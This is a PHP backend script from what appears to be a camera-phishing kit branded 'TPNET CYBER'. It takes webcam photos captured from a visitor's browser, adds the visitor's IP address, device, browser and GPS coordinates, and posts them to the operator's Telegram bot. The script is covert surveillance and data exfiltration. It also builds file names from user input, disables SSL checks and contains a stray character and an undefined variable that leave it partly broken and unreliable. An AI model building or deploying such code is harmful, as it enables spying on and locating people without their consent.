<?php
########################################
#
# SCRIPT BY TPNET CYBER
# BY LYXSEC
# COPYRIGHT TPNETCY
# SINCE 2023
# FOUND BUG JUST COMMENT IN MY CHANNEL
#
########################################
require_once __DIR__ . '/../vendor/Helpers/EnvLoader.php';
require_once __DIR__ . '/../vendor/Helpers/Network.php';
require_once __DIR__ . '/../vendor/Helpers/Device.php';
require_once __DIR__ . '/../vendor/Helpers/Location.php';
use Helpers\EnvLoader;
use Helpers\Network;
use Helpers\Device;
use Helpers\Location;
EnvLoader::load(__DIR__ . '/../.env');
$BOT_TOKEN = EnvLoader::get('BOT_TOKEN');
$USER_ID = EnvLoader::get('USER_ID');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = file_get_contents("php://input");
    $data = json_decode($input, true);
    if (!isset($data['image'], $data['camera'])) {
        http_response_code(400);
        echo json_encode(['status' => 'error', 'message' => 'Invalid data']);
        exit;
    }
    error_log("Base64 Data Received: " . substr($data['image'], 0, 100) . "...");
    if (!preg_match('#^data:image/\w+;base64,#i', $data['image']) || strlen($data['image']) < 50) {
        http_response_code(400);
        echo json_encode(['status' => 'error', 'message' => 'Invalid base64 data format']);
        exit;
    }
    $imageData = base64_decode(preg_replace('#^data:image/\w+;base64,#i', '', $data['image']), true);
    if ($imageData === false) {
        http_response_code(400);
        echo json_encode(['status' => 'error', 'message' => 'Base64 data failed to decode']);
        exit;
    }
    $filename = $data['camera'] . "_image.jpg";
    if (!file_put_contents($filename, $imageData)) {
        http_response_code(500);
        echo json_encode(['status' => 'error', 'message' => 'Failed to save image file']);
        exit;
    }
    if (!file_exists($filename) || filesize($filename) === 0) {
        unlink($filename);
        http_response_code(500);
        echo json_encode(['status' => 'error', 'message' => 'Image file is empty or invalid']);
        exit;
    }
    if (filesize($filename) > 10 * 1024 * 1024) {
        $image = @imagecreatefromjpeg($filename);
        if ($image) {
            imagejpeg($image, $filename, 75);
            imagedestroy($image);
        }
    }
    $ipAddress = Network::getUserIP();
    $geoLocation = [
    'latitude' => $latitude,
    'longitude' => $longitude,
    'location' => "Lat: $latitude, Long: $longitude"
];
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    $deviceInfo = Device::getDeviceInfo($userAgent);
    $browserInfo = Device::getBrowserInfo($userAgent);
    $caption = "📷 *Detail Camera*: {$data['camera']}\n\n";
    $caption .= "📱 *Device Information*:\n";
    $caption .= "  - Device Name: " . $deviceInfo['device'] . "\n";
    $caption .= "  - Android Version: " . $deviceInfo['android_version'] . "\n";
    $caption .= "  - Browser: $browserInfo\n";
    $caption .= "  - IP Address: $ipAddress\n";q
    $latitude = null;
    $longitude = null;
if (isset($data['latitude'], $data['longitude'])) {
    $latitude = $data['latitude'];
    $longitude = $data['longitude'];
}

$geoLocation = [
    'latitude' => $latitude ?? 'Unknown',
    'longitude' => $longitude ?? 'Unknown',
    'location' => isset($latitude, $longitude) ? "Lat: $latitude, Long: $longitude" : 'Location not found'
];

$caption .= "\n🌍 *User Location*:\n";
$caption .= "  - Latitude: {$geoLocation['latitude']}\n";
$caption .= "  - Longitude: {$geoLocation['longitude']}\n";
$caption .= "  - [View on Google Maps](https://www.google.com/maps?q={$geoLocation['latitude']},{$geoLocation['longitude']})\n";
    $url = "https://api.telegram.org/bot$BOT_TOKEN/sendPhoto";
    $postFields = [
        'chat_id' => $USER_ID,
        'photo' => curl_file_create($filename, 'image/jpeg', $filename),
        'caption' => $caption,
        'parse_mode' => 'Markdown'
    ];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);

    if ($response === false || $httpCode !== 200) {
        error_log("Telegram API Error: " . curl_error($ch));
        http_response_code(500);
        echo json_encode(['status' => 'error', 'message' => 'Failed to send photo to Telegram']);
    } else {
        unlink($filename);
        http_response_code(200);
        echo json_encode(['status' => 'success']);
    }
    curl_close($ch);
} else {
    http_response_code(405);
    echo json_encode(['status' => 'error', 'message' => 'Method not allowed']);
}
?>
